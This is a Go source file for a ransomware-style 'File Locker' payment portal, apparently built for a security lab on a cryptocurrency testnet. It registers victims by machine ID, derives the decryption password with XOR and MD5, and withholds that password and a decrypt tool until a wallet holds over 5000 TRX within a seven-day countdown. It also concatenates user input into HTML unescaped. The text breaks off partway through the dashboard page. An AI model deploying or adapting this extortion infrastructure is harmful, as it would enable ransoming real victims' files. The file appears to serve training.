package main

import (
	"crypto/md5"
	"database/sql"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	_ "github.com/mattn/go-sqlite3"
)

var db *sql.DB

type LoginData struct {
	MachineID     string
	Password      string
	WalletAddress string
	Balance       float64
	CreatedAt     time.Time
}

func resolveDBPath() string {
	const dockerDBPath = "/app/data/app.db"
	const hostDBPath = "/workspaces/csaf/data/locker/app.db"

	if info, err := os.Stat(filepath.Dir(dockerDBPath)); err == nil && info.IsDir() {
		return dockerDBPath
	}

	return hostDBPath
}

func resolveDecryptPath() string {
	const dockerDecryptPath = "/app/decrypt"
	const hostDecryptPath = "/workspaces/csaf/data/locker/decrypt"

	if info, err := os.Stat(dockerDecryptPath); err == nil && !info.IsDir() {
		return dockerDecryptPath
	}

	return hostDecryptPath
}

func resolveEncryptPath() string {
	const dockerEncryptPath = "/app/encrypt"
	const hostEncryptPath = "/workspaces/csaf/data/locker/encrypt"

	if info, err := os.Stat(dockerEncryptPath); err == nil && !info.IsDir() {
		return dockerEncryptPath
	}

	return hostEncryptPath
}

func initDB() error {
	var err error
	dbPath := resolveDBPath()
	db, err = sql.Open("sqlite3", dbPath)
	if err != nil {
		return fmt.Errorf("failed to open database: %v", err)
	}

	if err = db.Ping(); err != nil {
		return fmt.Errorf("failed to ping database: %v", err)
	}

	createTableSQL := `
	CREATE TABLE IF NOT EXISTS logins (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		machine_id TEXT UNIQUE NOT NULL,
		password TEXT NOT NULL,
		wallet_address TEXT NOT NULL,
		balance REAL NOT NULL DEFAULT 0.0,
		created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
		updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
	);
	`

	_, err = db.Exec(createTableSQL)
	if err != nil {
		return fmt.Errorf("failed to create table: %v", err)
	}

	return nil
}

func saveLogin(machineID, password, walletAddress string, balance float64) error {
	if db == nil {
		return fmt.Errorf("database not initialized")
	}

	insertSQL := `
	INSERT INTO logins (machine_id, password, wallet_address, balance) 
	VALUES (?, ?, ?, ?)
	ON CONFLICT(machine_id) DO UPDATE SET 
		password=excluded.password,
		wallet_address=excluded.wallet_address,
		balance=excluded.balance,
		updated_at=CURRENT_TIMESTAMP
	`

	_, err := db.Exec(insertSQL, machineID, password, walletAddress, balance)
	if err != nil {
		return fmt.Errorf("failed to save login: %v", err)
	}

	return nil
}

func getLogin(machineID string) (*LoginData, error) {
	if db == nil {
		return nil, fmt.Errorf("database not initialized")
	}

	var loginData LoginData
	querySQL := `
	SELECT machine_id, password, wallet_address, balance, created_at 
	FROM logins 
	WHERE machine_id = ?
	`

	row := db.QueryRow(querySQL, machineID)
	err := row.Scan(&loginData.MachineID, &loginData.Password, &loginData.WalletAddress, &loginData.Balance, &loginData.CreatedAt)
	if err != nil {
		if err == sql.ErrNoRows {
			return nil, nil
		}
		return nil, fmt.Errorf("failed to query login: %v", err)
	}

	return &loginData, nil
}

func getMachineIDWeb() (string, error) {
	switch runtime.GOOS {
	case "linux":
		return getMachineIDLinuxWeb()
	case "darwin":
		return getMachineIDMacOSWeb()
	case "windows":
		return getMachineIDWindowsWeb()
	default:
		return "", fmt.Errorf("unsupported operating system: %s", runtime.GOOS)
	}
}

func getMachineIDLinuxWeb() (string, error) {
	data, err := os.ReadFile("/etc/machine-id")
	if err != nil {
		return "", fmt.Errorf("failed to read machine-id: %v", err)
	}
	return strings.TrimSpace(string(data)), nil
}

func getMachineIDMacOSWeb() (string, error) {
	cmd := exec.Command("ioreg", "-rd1", "-c", "IOPlatformExpertDevice")
	output, err := cmd.Output()
	if err != nil {
		return "", fmt.Errorf("failed to run ioreg: %v", err)
	}

	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		if strings.Contains(line, "IOPlatformUUID") {
			parts := strings.Split(line, "\"")
			if len(parts) >= 4 {
				return strings.TrimSpace(parts[3]), nil
			}
		}
	}

	return "", fmt.Errorf("failed to find IOPlatformUUID in ioreg output")
}

func getMachineIDWindowsWeb() (string, error) {
	cmd := exec.Command("wmic", "csproduct", "get", "uuid")
	output, err := cmd.Output()
	if err != nil {
		return getMachineIDWindowsRegistryWeb()
	}

	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" && line != "UUID" {
			return line, nil
		}
	}

	return "", fmt.Errorf("failed to find UUID from wmic")
}

func getMachineIDWindowsRegistryWeb() (string, error) {
	cmd := exec.Command("reg", "query", "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\SQMClient", "/v", "MachineId")
	output, err := cmd.Output()
	if err != nil {
		return "", fmt.Errorf("failed to query registry: %v", err)
	}

	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		if strings.Contains(line, "MachineId") {
			parts := strings.Fields(line)
			if len(parts) > 0 {
				return parts[len(parts)-1], nil
			}
		}
	}

	return "", fmt.Errorf("failed to find MachineId in registry")
}

func xorBytesWeb(data []byte, key []byte) []byte {
	result := make([]byte, len(data))
	keyLen := len(key)
	for i, b := range data {
		result[i] = b ^ key[i%keyLen]
	}
	return result
}

func generatePassword(machineID string) (string, error) {
	if machineID == "" {
		return "", fmt.Errorf("machineID is empty")
	}

	machineIDBytes := []byte(machineID)
	xoredBytes := xorBytesWeb(machineIDBytes, xorKey)
	hash := md5.Sum(xoredBytes)
	password := fmt.Sprintf("%x", hash)
	return password, nil
}

func loginHandler(w http.ResponseWriter, r *http.Request) {
	fmt.Printf("[%s] Login page accessed from %s\n", time.Now().Format("2006-01-02 15:04:05"), r.RemoteAddr)
	html := `<!DOCTYPE html>
<html lang="id">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>File Locker - Login</title>
	<link rel="icon" type="image/png" href="https://csalab-id.github.io/images/logo.png">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
	<style>
		* {
			margin: 0;
			padding: 0;
			box-sizing: border-box;
		}

		body {
			font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
			background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
			display: flex;
			justify-content: center;
			align-items: center;
			height: 100vh;
			padding: 20px;
		}

		.container {
			background: white;
			border-radius: 10px;
			box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
			padding: 40px;
			width: 100%;
			max-width: 500px;
		}

		.header {
			text-align: center;
			margin-bottom: 30px;
		}

		.header h1 {
			color: #333;
			margin-bottom: 10px;
			font-size: 28px;
		}

		.header p {
			color: #666;
			font-size: 14px;
		}

		.info-box {
			background: #f0f4ff;
			border-left: 4px solid #667eea;
			padding: 15px;
			margin-bottom: 25px;
			border-radius: 4px;
			font-size: 14px;
		}

		.info-box strong {
			display: block;
			margin-bottom: 5px;
			color: #333;
		}

		.info-box code {
			background: white;
			padding: 5px 10px;
			border-radius: 3px;
			word-break: break-all;
			color: #667eea;
			font-family: 'Courier New', monospace;
		}

		.form-group {
			margin-bottom: 20px;
		}

		.form-group label {
			display: block;
			margin-bottom: 8px;
			color: #333;
			font-weight: 500;
			font-size: 14px;
		}

		.form-group input {
			width: 100%;
			padding: 12px;
			border: 2px solid #e0e0e0;
			border-radius: 5px;
			font-size: 14px;
			transition: border-color 0.3s;
			font-family: 'Courier New', monospace;
		}

		.form-group input:focus {
			outline: none;
			border-color: #667eea;
		}

		.form-group input::placeholder {
			color: #999;
		}

		.button-group {
			display: flex;
			gap: 10px;
		}

		button {
			flex: 1;
			padding: 12px;
			border: none;
			border-radius: 5px;
			font-size: 14px;
			font-weight: 600;
			cursor: pointer;
			transition: all 0.3s;
		}

		.btn-login {
			background: #667eea;
			color: white;
		}

		.btn-login:hover {
			background: #5568d3;
			box-shadow: 0 4px 12px rgba(102, 126, 234, 0.3);
		}

		.btn-login:active {
			transform: scale(0.98);
		}

		.btn-download-encrypt {
			background: #28a745;
			color: white;
		}

		.btn-download-encrypt:hover {
			background: #218838;
			box-shadow: 0 4px 12px rgba(40, 167, 69, 0.3);
		}

		.btn-download-encrypt:active {
			transform: scale(0.98);
		}

		.error {
			background: #fee;
			color: #c33;
			padding: 12px;
			border-radius: 5px;
			margin-bottom: 20px;
			font-size: 14px;
			display: none;
		}

		.success {
			background: #efe;
			color: #3c3;
			padding: 12px;
			border-radius: 5px;
			margin-bottom: 20px;
			font-size: 14px;
			display: none;
		}

		.footer {
			text-align: center;
			margin-top: 20px;
			color: #999;
			font-size: 12px;
		}
	</style>
</head>
<body>
	<div class="container">
		<div class="header">
			<h1>🔐 File Locker</h1>
			<p>Login with Machine ID</p>
		</div>

		<div id="error" class="error"></div>
		<div id="success" class="success"></div>

		<form id="loginForm">
			<div class="form-group">
				<label for="machineId">Enter Machine ID:</label>
				<input 
					type="text" 
					id="machineId" 
					name="machineId" 
					placeholder="Paste machine ID here..."
					required
				>
			</div>

			<div class="button-group">
				<button type="submit" class="btn-login">
					Login
				</button>
			</div>
		</form>

		<div class="button-group" style="margin-top: 10px;">
			<button type="button" class="btn-download-encrypt" onclick="downloadEncrypt()">
				<i class="fas fa-download"></i> Download Encrypt Tool
			</button>
		</div>

		<div class="footer">
			<p>Enter Machine ID to generate encryption password</p>
		</div>
	</div>

	<script>
		const form = document.getElementById('loginForm');
		const machineIdInput = document.getElementById('machineId');
		const errorDiv = document.getElementById('error');
		const successDiv = document.getElementById('success');

		form.addEventListener('submit', async (e) => {
			e.preventDefault();
			errorDiv.style.display = 'none';
			successDiv.style.display = 'none';

			const machineId = machineIdInput.value.trim();
			if (!machineId) {
				errorDiv.textContent = 'Machine ID cannot be empty';
				errorDiv.style.display = 'block';
				return;
			}

			try {
				const response = await fetch('/api/login', {
					method: 'POST',
					headers: {
						'Content-Type': 'application/json'
					},
					body: JSON.stringify({ 
						machineId: machineId
					})
				});

				const data = await response.json();

				if (response.ok) {
					window.location.href = '/dashboard?machineId=' + encodeURIComponent(machineId);
				} else {
					errorDiv.textContent = data.error || 'Login failed';
					errorDiv.style.display = 'block';
				}
			} catch (err) {
				errorDiv.textContent = 'Error: ' + err.message;
				errorDiv.style.display = 'block';
			}
		});

		function downloadEncrypt() {
			window.location.href = '/download/encrypt';
		}
	</script>
</body>
</html>`

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprint(w, html)
}

func apiLoginHandler(w http.ResponseWriter, r *http.Request) {
	fmt.Printf("[%s] API login request from %s\n", time.Now().Format("2006-01-02 15:04:05"), r.RemoteAddr)
	if r.Method != http.MethodPost {
		w.WriteHeader(http.StatusMethodNotAllowed)
		json.NewEncoder(w).Encode(map[string]string{"error": "Method not allowed"})
		return
	}

	defer r.Body.Close()
	var payload struct {
		MachineID string `json:"machineId"`
	}

	if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{"error": "Invalid JSON"})
		return
	}

	machineID := strings.TrimSpace(payload.MachineID)
	if machineID == "" {
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{"error": "Machine ID cannot be empty"})
		return
	}

	if len(machineID) < 3 {
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{"error": "Invalid Machine ID"})
		return
	}

	fmt.Printf("[%s] Login attempt with Machine ID: %s\n", time.Now().Format("2006-01-02 15:04:05"), machineID)

	password, err := generatePassword(machineID)
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]string{"error": "Failed to generate password"})
		return
	}

	existingData, err := getLogin(machineID)
	if err != nil {
		fmt.Printf("Warning: Failed to check existing login data: %v\n", err)
	}

	if existingData == nil {
		walletAddress := "N/A"
		balance := 0.0

		if err := saveLogin(machineID, password, walletAddress, balance); err != nil {
			fmt.Printf("Warning: Failed to save login to database: %v\n", err)
		}
	}

	fmt.Printf("[%s] Login successful for Machine ID: %s\n", time.Now().Format("2006-01-02 15:04:05"), machineID)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"success": true,
		"message": "Login successful",
	})
}

func generatePasswordHandler(w http.ResponseWriter, r *http.Request) {
	fmt.Printf("[%s] Generate password request from %s\n", time.Now().Format("2006-01-02 15:04:05"), r.RemoteAddr)
	if r.Method != http.MethodPost {
		w.WriteHeader(http.StatusMethodNotAllowed)
		json.NewEncoder(w).Encode(map[string]string{"error": "Method not allowed"})
		return
	}

	defer r.Body.Close()
	var payload struct {
		MachineID string `json:"machineid"`
	}

	decoder := json.NewDecoder(r.Body)
	decoder.DisallowUnknownFields()
	if err := decoder.Decode(&payload); err != nil {
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{"error": fmt.Sprintf("invalid payload: %v", err)})
		return
	}

	machineID := strings.TrimSpace(payload.MachineID)
	if machineID == "" {
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{"error": "machineID is empty"})
		return
	}

	existingData, err := getLogin(machineID)
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]string{"error": "Failed to check database"})
		return
	}

	if existingData != nil {
		fmt.Printf("[%s] Generate password blocked - Machine ID already registered: %s\n", time.Now().Format("2006-01-02 15:04:05"), machineID)
		w.WriteHeader(http.StatusForbidden)
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Machine ID already registered. This endpoint is no longer accessible for this machine.",
		})
		return
	}

	password, err := generatePassword(machineID)
	if err != nil {
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{"error": err.Error()})
		return
	}

	walletAddress := "N/A"
	balance := 0.0
	if err := saveLogin(machineID, password, walletAddress, balance); err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]string{"error": "Failed to save generated credentials"})
		return
	}

	fmt.Printf("[%s] Password generated successfully for Machine ID: %s\n", time.Now().Format("2006-01-02 15:04:05"), machineID)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"password": password,
	})
}

func updateWalletHandler(w http.ResponseWriter, r *http.Request) {
	fmt.Printf("[%s] Update wallet request from %s\n", time.Now().Format("2006-01-02 15:04:05"), r.RemoteAddr)
	if r.Method != http.MethodPost {
		w.WriteHeader(http.StatusMethodNotAllowed)
		json.NewEncoder(w).Encode(map[string]string{"error": "Method not allowed"})
		return
	}

	defer r.Body.Close()
	var payload struct {
		MachineID     string `json:"machineId"`
		WalletAddress string `json:"walletAddress"`
	}

	if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{"error": "Invalid JSON"})
		return
	}

	machineID := strings.TrimSpace(payload.MachineID)
	if machineID == "" {
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{"error": "Machine ID cannot be empty"})
		return
	}

	walletAddress := strings.TrimSpace(payload.WalletAddress)
	if walletAddress == "" {
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{"error": "Wallet address cannot be empty"})
		return
	}

	existingLogin, err := getLogin(machineID)
	if err == nil && existingLogin != nil {
		deadline := existingLogin.CreatedAt.Add(7 * 24 * time.Hour)
		if time.Now().After(deadline) && existingLogin.WalletAddress == "N/A" {
			fmt.Printf("[%s] Wallet update blocked - Deadline has expired for Machine ID: %s\n", time.Now().Format("2006-01-02 15:04:05"), machineID)
			w.WriteHeader(http.StatusForbidden)
			json.NewEncoder(w).Encode(map[string]string{"error": "Deadline has expired. You can no longer update your wallet address."})
			return
		}
	}

	existingByWallet, err := getLoginByWallet(walletAddress)
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]string{"error": "Failed to check wallet address"})
		return
	}
	if existingByWallet != nil {
		if existingByWallet.MachineID != machineID {
			fmt.Printf("[%s] Wallet update blocked - Address already exists: %s\n", time.Now().Format("2006-01-02 15:04:05"), walletAddress)
			w.WriteHeader(http.StatusConflict)
			json.NewEncoder(w).Encode(map[string]string{"error": "Wallet address already exists"})
			return
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": true,
			"message": "Wallet address already set",
			"balance": fmt.Sprintf("%.8f", existingByWallet.Balance),
		})
		return
	}

	balance, err := getTronBalance(walletAddress)
	if err != nil {
		fmt.Printf("Warning: Failed to get TRON balance: %v\n", err)
		balance = 0.0
	}

	password, err := generatePassword(machineID)
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]string{"error": "Failed to generate password"})
		return
	}

	if err := saveLogin(machineID, password, walletAddress, balance); err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]string{"error": "Failed to update wallet info"})
		return
	}

	fmt.Printf("[%s] Wallet updated - Machine ID: %s, Wallet: %s, Balance: %.8f TRX\n", time.Now().Format("2006-01-02 15:04:05"), machineID, walletAddress, balance)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"success": true,
		"message": "Wallet address updated successfully",
		"balance": fmt.Sprintf("%.8f", balance),
	})
}

func getLoginByWallet(walletAddress string) (*LoginData, error) {
	if db == nil {
		return nil, fmt.Errorf("database not initialized")
	}

	var loginData LoginData
	querySQL := `
	SELECT machine_id, password, wallet_address, balance, created_at
	FROM logins
	WHERE wallet_address = ?
	LIMIT 1
	`

	row := db.QueryRow(querySQL, walletAddress)
	err := row.Scan(&loginData.MachineID, &loginData.Password, &loginData.WalletAddress, &loginData.Balance, &loginData.CreatedAt)
	if err != nil {
		if err == sql.ErrNoRows {
			return nil, nil
		}
		return nil, fmt.Errorf("failed to query login by wallet: %v", err)
	}

	return &loginData, nil
}

type TronAccountResponse struct {
	Balance int64  `json:"balance"`
	Address string `json:"address"`
}

type TronApiResponse struct {
	Balance int64  `json:"balance"`
	Address string `json:"address"`
}

func getTronBalance(address string) (float64, error) {
	apiURL := fmt.Sprintf("https://nileapi.tronscan.org/api/accountv2?address=%s", address)

	client := &http.Client{
		Timeout: 10 * time.Second,
	}

	resp, err := client.Get(apiURL)
	if err != nil {
		return 0, fmt.Errorf("failed to query TRON API: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return 0, fmt.Errorf("TRON API returned status %d", resp.StatusCode)
	}

	var result map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return 0, fmt.Errorf("failed to decode TRON API response: %v", err)
	}

	if balance, ok := result["balance"].(float64); ok {
		return balance / 1000000, nil
	}

	return 0.0, nil
}

func dashboardHandler(w http.ResponseWriter, r *http.Request) {
	fmt.Printf("[%s] Dashboard accessed from %s\n", time.Now().Format("2006-01-02 15:04:05"), r.RemoteAddr)
	machineID := r.URL.Query().Get("machineId")
	if machineID == "" {
		http.Redirect(w, r, "/", http.StatusTemporaryRedirect)
		return
	}
	fmt.Printf("[%s] Dashboard loaded for Machine ID: %s\n", time.Now().Format("2006-01-02 15:04:05"), machineID)

	password, err := generatePassword(machineID)
	if err != nil {
		http.Error(w, "Failed to generate password", http.StatusInternalServerError)
		return
	}

	var walletAddress string = "N/A"
	var balance float64 = 0.0
	var createdAt time.Time
	var deadlineTimestamp int64 = 0

	if loginData, err := getLogin(machineID); err == nil && loginData != nil {
		walletAddress = loginData.WalletAddress
		balance = loginData.Balance
		createdAt = loginData.CreatedAt
		deadline := createdAt.Add(7 * 24 * time.Hour)
		deadlineTimestamp = deadline.Unix() * 1000
	}

	deadlineExpired := false
	if !createdAt.IsZero() {
		deadline := createdAt.Add(7 * 24 * time.Hour)
		deadlineExpired = time.Now().After(deadline)
	}

	showPassword := balance > 5000 && !deadlineExpired
	canDownload := balance > 5000 && !deadlineExpired
	canUpdateWallet := !(deadlineExpired && walletAddress == "N/A")
	countdownGreen := walletAddress != "N/A" && balance > 5000

	var passwordHtml string
	if showPassword {
		passwordHtml = `<div class="info-item">
			<label class="info-label">Your Encryption Password:</label>
			<div class="info-value">
				<span id="passwordHashValue">` + password + `</span>
				<button type="button" class="copy-btn" onclick="copyPasswordHash()"><i class="fas fa-copy"></i></button>
			</div>
		</div>`
	} else {
		var hideReason string
		if deadlineExpired {
			hideReason = "Deadline expired"
		} else {
			hideReason = "balance < 5000 TRX"
		}
		passwordHtml = `<div class="info-item">
			<label class="info-label">Your Encryption Password:</label>
			<div class="info-value">
				<span id="passwordHashValue">Hidden (` + hideReason + `)</span>
			</div>
		</div>`
	}

	var downloadButtonHtml string
	if canDownload {
		downloadButtonHtml = `<button type="button" class="btn-download" onclick="downloadDecrypt()">
				<i class="fas fa-download"></i>Download Decrypt Tool
			</button>`
	} else {
		var lockReason string
		if deadlineExpired {
			lockReason = "Deadline expired"
		} else {
			lockReason = "balance < 5000 TRX"
		}
		downloadButtonHtml = `<button type="button" class="btn-download" disabled style="opacity: 0.5; cursor: not-allowed;" title="` + lockReason + `">
				<i class="fas fa-lock"></i>Locked (` + lockReason + `)
			</button>`
	}

	var updateWalletHtml string
	if canUpdateWallet {
		updateWalletHtml = `<div class="update-section">
					<h3>📝 Update Wallet Information</h3>
					<div class="update-form">
						<div class="update-form-group">
							<input
								type="text"
								id="updateWalletAddress"
								placeholder="Wallet Address"
								value="` + walletAddress + `"
							>
						</div>
						<button type="button" class="btn-update" onclick="updateWalletInfo()">Update</button>
					</div>
					<div id="updateMessage" style="margin-top: 10px; font-size: 12px; display: none;"></div>
				</div>`
	} else {
		updateWalletHtml = `<div class="update-section">
					<h3>📝 Update Wallet Information</h3>
					<div style="background: #ffe0e0; border: 2px solid #ff4757; padding: 15px; border-radius: 8px; text-align: center; color: #c92a2a; font-weight: 600;">
						⚠️ Deadline has expired. You can no longer update your wallet address.
					</div>
				</div>`
	}

	html := `<!DOCTYPE html>
<html lang="id">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>File Locker - Dashboard</title>
	<link rel="icon" type="image/png" href="https://csalab-id.github.io/images/logo.png">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
	<style>
		* {
			margin: 0;
			padding: 0;
			box-sizing: border-box;
		}

		body {
			font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
			background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
			display: flex;
			justify-content: center;
			align-items: center;
			min-height: 100vh;
			padding: 20px;
		}

		.container {
			background: white;
			border-radius: 10px;
			box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
			padding: 40px;
			width: 100%;
			max-width: 1200px;
		}

		.header {
			text-align: center;
			margin-bottom: 30px;
		}

		.header h1 {
			color: #333;
			margin-bottom: 10px;
			font-size: 28px;
		}

		.header p {
			color: #666;
			font-size: 14px;
		}

		.success-badge {
			display: inline-block;
			background: #4caf50;
			color: white;
			padding: 8px 16px;
			border-radius: 20px;
			font-size: 12px;
			margin-top: 10px;
		}

		.dashboard-grid {
			display: grid;
			grid-template-columns: 1fr 1fr;
			gap: 20px;
			margin-bottom: 20px;
		}

		@media (max-width: 768px) {
			.dashboard-grid {
				grid-template-columns: 1fr;
			}
		}

		.column {
			display: flex;
			flex-direction: column;
			gap: 20px;
		}

		.info-section {
			background: #f9f9f9;
			border-radius: 8px;
			padding: 25px;
			height: fit-content;
		}

		.section-title {
			color: #333;
			font-size: 16px;
			font-weight: 600;
			margin-bottom: 20px;
			padding-bottom: 10px;
			border-bottom: 2px solid #667eea;
		}

		.info-item {
			margin-bottom: 20px;
		}

		.info-item:last-child {
			margin-bottom: 0;
		}

		.info-label {
			color: #666;
			font-size: 12px;
			font-weight: 600;
			text-transform: uppercase;
			letter-spacing: 0.5px;
			margin-bottom: 8px;
			display: block;
		}

		.info-value {
			background: white;
			border: 2px solid #e0e0e0;
			padding: 15px;
			border-radius: 5px;
			font-family: 'Courier New', monospace;
			font-size: 13px;
			word-break: break-all;
			display: flex;
			justify-content: space-between;
			align-items: center;
		}

		.copy-btn {
			background: #667eea;
			color: white;
			border: none;
			padding: 6px;
			border-radius: 4px;
			cursor: pointer;
			font-size: 14px;
			font-weight: 600;
			transition: all 0.3s;
			flex: none;
			margin-left: 10px;
			width: 32px;
			height: 32px;
			display: flex;
			align-items: center;
			justify-content: center;
		}

		.copy-btn:hover {
			background: #5568d3;
		}

		.copy-btn:active {
			transform: scale(0.95);
		}

		.password-highlight {
			background: #fff3cd;
			padding: 15px;
			border-left: 4px solid #ffc107;
			margin-bottom: 20px;
			border-radius: 4px;
		}

		.password-highlight h3 {
			color: #856404;
			margin-bottom: 8px;
			font-size: 14px;
		}

		.password-value {
			background: white;
			padding: 15px;
			border-radius: 5px;
			font-family: 'Courier New', monospace;
			font-size: 16px;
			font-weight: bold;
			color: #333;
			word-break: break-all;
			margin-bottom: 10px;
			display: flex;
			justify-content: space-between;
			align-items: center;
		}

		.button-group {
			display: flex;
			gap: 10px;
		}

		.timer-section {
			background: #fff5f5;
			border-left: 4px solid #ff4757;
			padding: 20px;
			border-radius: 4px;
			height: fit-content;
		}

		.timer-section.green {
			background: #f0fff4;
			border-left: 4px solid #4caf50;
		}

		.timer-section h3 {
			color: #333;
			margin-bottom: 15px;
			font-size: 16px;
			font-weight: 600;
			display: flex;
			align-items: center;
			gap: 8px;
		}

		.countdown-container {
			display: grid;
			grid-template-columns: repeat(4, 1fr);
			gap: 10px;
			margin-top: 10px;
		}

		.countdown-item {
			background: white;
			border-radius: 8px;
			padding: 15px 10px;
			text-align: center;
			box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
		}

		.countdown-value {
			font-size: 24px;
			font-weight: bold;
			color: #ff4757;
			font-family: 'Courier New', monospace;
			display: block;
		}

		.countdown-value.green {
			color: #4caf50;
		}

		.countdown-label {
			font-size: 11px;
			color: #666;
			text-transform: uppercase;
			letter-spacing: 0.5px;
			margin-top: 5px;
			display: block;
		}

		.countdown-expired {
			background: #ffe0e0;
			border: 2px solid #ff4757;
			padding: 15px;
			border-radius: 8px;
			text-align: center;
			color: #c92a2a;
			font-weight: 600;
			margin-top: 10px;
		}

		.update-section {
			background: #f0f8ff;
			border-left: 4px solid #667eea;
			padding: 20px;
			border-radius: 4px;
			height: fit-content;
		}

		.update-section h3 {
			color: #333;
			margin-bottom: 15px;
			font-size: 16px;
			font-weight: 600;
		}

		.update-form {
			display: flex;
			flex-direction: column;
			gap: 12px;
		}

		.update-form-group {
			display: flex;
			flex-direction: column;
			gap: 10px;
		}

		.update-form-group input {
			flex: 1;
			padding: 10px;
			border: 2px solid #e0e0e0;
			border-radius: 4px;
			font-size: 13px;
			font-family: 'Courier New', monospace;
		}

		.update-form-group input:focus {
			outline: none;
			border-color: #667eea;
		}

		.btn-update {
			background: #4caf50;
			color: white;
			padding: 10px 20px;
			width: 100%;
		}

		.btn-update:hover {
			background: #45a049;
		}

		.btn-download {
			background: #667eea;
			color: white;
			padding: 10px 20px;
			width: 100%;
			margin-top: 10px;
		}

		.btn-download:hover {
			background: #5568d3;
		}

		.btn-download i {
			margin-right: 8px;
		}

		button {
			flex: 1;
			padding: 12px;
			border: none;
			border-radius: 5px;
			font-size: 14px;
			font-weight: 600;
			cursor: pointer;
			transition: all 0.3s;
		}

		.btn-logout {
			background: #667eea;
			color: white;
		}

		.btn-logout:hover {
			background: #5568d3;
		}

		.btn-copy {
			background: #f0f0f0;
			color: #333;
			border: 2px solid #e0e0e0;
		}

		.btn-copy:hover {
			background: #e0e0e0;
		}

		.toast {
			position: fixed;
			bottom: 20px;
			right: 20px;
			background: #4caf50;
			color: white;
			padding: 15px 20px;
			border-radius: 5px;
			box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
			display: none;
			z-index: 1000;
		}

		.toast.show {
			display: block;
			animation: slideIn 0.3s ease;
		}

		@keyframes slideIn {
			from {
				transform: translateX(400px);
				opacity: 0;
			}
			to {
				transform: translateX(0);
				opacity: 1;
			}
		}
	</style>
</head>
<body>
	<div class="container">
		<div class="header">
			<h1>🔐 File Locker</h1>
			<p>Dashboard</p>
			<div class="success-badge">✓ Login Successful</div>
		</div>

		<div class="dashboard-grid">
			<!-- Column 1: Database Information -->
			<div class="column">
				<div class="info-section">
					<h3 class="section-title">📊 Database Information</h3>
					<div class="info-item">
						<label class="info-label">Machine ID:</label>
						<div class="info-value">
							<span id="machineIdValue">` + machineID + `</span>
							<button type="button" class="copy-btn" onclick="copyMachineId()"><i class="fas fa-copy"></i></button>
						</div>
					</div>

					` + passwordHtml + `

					<div class="info-item">
						<label class="info-label">Wallet Address (Tron Nile):</label>
						<div class="info-value">
							<span id="walletAddressValue">` + walletAddress + `</span>
							<button type="button" class="copy-btn" onclick="copyWalletAddress()"><i class="fas fa-copy"></i></button>
						</div>
					</div>

					<div class="info-item">
						<label class="info-label">Balance (TRX):</label>
						<div class="info-value">
							<span id="balanceValue">` + fmt.Sprintf("%.8f", balance) + `</span>
						</div>
					</div>
				</div>
			</div>

			<!-- Column 2: Timer, Update Wallet & Tools -->
			<div class="column">
				<div class="timer-section` + func() string {
		if countdownGreen {
			return " green"
		}
		return ""
	}() + `">
					<h3><i class="fas fa-clock"></i> Countdown Timer</h3>
					<p style="font-size: 12px; color: #666; margin-bottom: 10px;">Time remaining until deadline:</p>
					<div id="countdown" class="countdown-container">
						<div class="countdown-item">
							<span id="days" class="countdown-value` + func() string {
		if countdownGreen {
			return " green"
		}
		return ""
	}() + `">--</span>
